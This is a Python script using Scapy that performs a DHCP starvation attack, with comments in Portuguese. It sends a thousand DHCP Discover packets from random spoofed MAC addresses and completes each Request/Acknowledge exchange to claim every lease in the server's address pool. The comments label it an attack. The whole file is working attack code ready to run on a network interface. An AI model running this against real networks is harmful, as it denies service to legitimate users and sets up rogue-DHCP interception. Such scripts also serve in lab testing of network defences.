from scapy.all import *
import time

def dhcp_starvation(interface, num_packets, delay):
    conf.checkIPaddr = False

    for _ in range(num_packets):
        # Gerar um endereço MAC aleatório
        mac_address = RandMAC()
        print(f"Sending DHCP Discover with MAC {mac_address}")

        # Construir o pacote DHCP Discover
        dhcp_discover = (
            Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_address) /
            DHCP(options=[("message-type", "discover"), ("end")])
        )

        # Enviar o pacote DHCP Discover
        sendp(dhcp_discover, iface=interface, verbose=0)

        # Aguardar um pequeno intervalo entre os pacotes
        time.sleep(delay)

        # Aguardar e capturar a resposta DHCP Offer
        pkt = sniff(filter="udp and (port 67 or port 68)", count=1, timeout=2, iface=interface)
        if pkt:
            if DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 2:  # DHCP Offer
                print(f"Received DHCP Offer from {pkt[0][IP].src}")
                # Construir o pacote DHCP Request
                dhcp_request = (
                    Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac_address, xid=pkt[0][BOOTP].xid) /
                    DHCP(options=[("message-type", "request"),
                                  ("requested_addr", pkt[0][BOOTP].yiaddr),
                                  ("server_id", pkt[0][IP].src),
                                  ("end")])
                )
                # Enviar o pacote DHCP Request
                sendp(dhcp_request, iface=interface, verbose=0)

                # Aguardar e capturar a resposta DHCP Acknowledge
                pkt = sniff(filter="udp and (port 67 or port 68)", count=1, timeout=2, iface=interface)
                if pkt:
                    if DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 5:  # DHCP Acknowledge
                        print(f"Received DHCP Acknowledge from {pkt[0][IP].src}")
                    else:
                        print("No DHCP Acknowledge received.")
                else:
                    print("No DHCP response received for Request.")
            else:
                print("No DHCP Offer received.")
        else:
            print("No DHCP response received for Discover.")

if __name__ == "__main__":
    interface = "eth0"   # Interface de rede a ser usada para o ataque
    num_packets = 1000   # Número de pacotes a serem enviados
    delay = 0.1          # Atraso entre pacotes em segundos

    dhcp_starvation(interface, num_packets, delay)

